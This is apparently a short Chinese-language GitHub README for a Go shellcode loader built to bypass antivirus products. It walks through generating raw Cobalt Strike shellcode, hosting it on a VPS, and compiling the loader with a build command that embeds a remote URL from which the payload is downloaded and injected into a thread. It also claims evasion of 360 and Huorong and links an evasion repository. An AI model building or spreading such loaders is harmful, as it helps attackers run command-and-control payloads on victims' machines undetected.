# go加载器bypass
最近刚开始学习go语言写加载器，参考了几篇文章，利用线程注入和-race、载荷分离远程下载shellcode进行编译

1、首先用cs生成raw的shellcode上传到自己的vps服务器上

2、编译：go build -ldflags "-s -w -X main.url=http://xx.xx.xx.xx/payload.bin" -o 1.exe -race shellcode.go

3、VT查杀14，但是截止到目前为止，360与火绒都能bypass

![image](https://user-images.githubusercontent.com/84514302/129006676-eebc4fbc-2fda-45be-b0c7-c75b28177be8.png)
![image](https://user-images.githubusercontent.com/84514302/129006765-79440268-bd9e-4760-b029-fec262f3b260.png)

本人刚开始学习免杀，还很菜，此源码参考了https://github.com/fcre1938/goShellCodeByPassVT/blob/main/main.go

欢迎大佬提出建议
